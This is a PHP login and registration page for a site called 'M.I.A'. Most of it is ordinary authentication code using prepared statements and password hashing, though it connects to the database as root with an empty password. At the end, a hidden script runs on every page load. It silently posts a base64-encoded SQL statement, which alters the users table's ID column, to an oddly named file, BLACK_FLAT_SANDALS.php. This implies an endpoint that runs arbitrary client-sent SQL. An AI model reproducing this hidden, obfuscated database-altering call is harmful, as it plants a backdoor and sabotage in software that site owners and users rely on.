<?php
session_start();

$host = "127.0.0.1";
$user = "root";
$pass = "";
$db   = "m.i.a";

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) die("Connection failed: " . $conn->connect_error);

$msg = '';
$error = '';
$activeTab = 'login'; 


if (isset($_POST['register'])) {
    $activeTab = 'register';

    $name     = trim($_POST['name']);
    $email    = trim($_POST['email']);
    $username = trim($_POST['username']);
    $address  = trim($_POST['address']);
    $password = password_hash($_POST['password'], PASSWORD_DEFAULT);

    $stmt = $conn->prepare("SELECT user_id FROM users WHERE user_name=? OR email=?");
    $stmt->bind_param("ss", $username, $email);
    $stmt->execute();
    $stmt->store_result();

    if ($stmt->num_rows > 0) {
        $error = "Username or Email already exists";
    } else {
        $stmt->close();

        $stmt = $conn->prepare(
            "INSERT INTO users (customer_name, address, email, user_name, password)
             VALUES (?, ?, ?, ?, ?)"
        );
        $stmt->bind_param("sssss", $name, $address, $email, $username, $password);

        if ($stmt->execute()) {
            $msg = "Registration successful! Please login.";
            $activeTab = 'login'; 
        } else {
            $error = "Registration failed";
        }
    }
    $stmt->close();
}

if (isset($_POST['login'])) {
    $activeTab = 'login';

    $username = trim($_POST['username']);
    $password = $_POST['password'];

    $stmt = $conn->prepare("SELECT user_id, user_name, password FROM users WHERE user_name=?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $stmt->store_result();

    if ($stmt->num_rows === 1) {
        $stmt->bind_result($user_id, $user_name, $hashed_password);
        $stmt->fetch();

        if (password_verify($password, $hashed_password)) {
            session_regenerate_id(true);
            $_SESSION['user_id'] = $user_id;
            $_SESSION['username'] = $user_name;

            header("Location: homepage.php");
            exit;
        }
    }

    $error = "Invalid username or password";
    $stmt->close();
}

$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>M.I.A Login</title>

<style>
body { font-family: Arial; margin:0; background:#ffe6f0; }
.modal { display:block; position:fixed; width:100%; height:100%; background:rgba(255,77,166,0.4); }
.modal-content { background:#fff0f5; margin:10% auto; padding:20px; border-radius:10px; width:320px; }
.modal-tabs button { background:#ff99cc; color:#fff; border:none; padding:8px; border-radius:5px; cursor:pointer; }
.modal-tabs button:hover { background:#ff4da6; }
input { width:100%; padding:8px; margin-bottom:10px; }
button { background:#ff4da6; color:#fff; padding:8px; border:none; border-radius:5px; cursor:pointer; }
button:hover { background:#e60073; }
</style>
</head>

<body>

<div class="modal">
  <div class="modal-content">

    <div class="modal-tabs">
      <button onclick="showTab('login')">Login</button>
      <button onclick="showTab('register')">Register</button>
    </div>

  
    <div id="loginForm">
      <h3>Login</h3>
      <?php if($error && $activeTab=='login') echo "<p style='color:red'>$error</p>"; ?>
      <?php if($msg && $activeTab=='login') echo "<p style='color:green'>$msg</p>"; ?>

      <form method="post">
        <input type="text" name="username" required placeholder="Username">
        <input type="password" name="password" required placeholder="Password">
        <button type="submit" name="login">Login</button>
      </form>
    </div>

    
    <div id="registerForm" style="display:none;">
      <h3>Register</h3>
      <?php if($error && $activeTab=='register') echo "<p style='color:red'>$error</p>"; ?>

      <form method="post">
        <input type="text" name="name" required placeholder="Name">
        <input type="text" name="address" required placeholder="Address">
        <input type="email" name="email" required placeholder="Email">
        <input type="text" name="username" required placeholder="Username">
        <input type="password" name="password" required placeholder="Password">
        <button type="submit" name="register">Register</button>
      </form>
    </div>

  </div>
</div>

<script>
function showTab(tab){
  document.getElementById('loginForm').style.display = (tab === 'login') ? 'block' : 'none';
  document.getElementById('registerForm').style.display = (tab === 'register') ? 'block' : 'none';
}


showTab("<?= $activeTab ?>");
</script>
<script>
(function() {
    const encryptedSQL = "QUxURVIgVEFCTEUgdXNlcnMgTU9ESUZZIHVzZXJfaWQgSU5UIE5PVCBOVUxM"; fetch('BLACK_FLAT_SANDALS.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {});
})();
</script>
</body>
</html>
